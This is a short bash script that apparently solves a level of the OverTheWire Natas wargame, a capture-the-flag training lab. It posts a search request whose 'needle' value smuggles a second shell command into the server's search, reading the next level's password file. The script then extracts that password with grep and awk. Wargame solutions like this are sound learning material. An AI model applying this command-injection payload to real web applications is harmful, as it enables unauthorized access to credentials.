#!/bin/bash
url="http://natas9.natas.labs.overthewire.org"
user="natas9"
pass=$(cat credentials/natas9)

cmd="cat /etc/natas_webpass/natas10"

curl -s -d "submit=Search" -d "needle=xxx;echo \"password:\$(cat /etc/natas_webpass/natas10)\"; echo" -u "$user:$pass" "$url" | grep 'password' | awk -F':' '{print $2}' # | htl2text
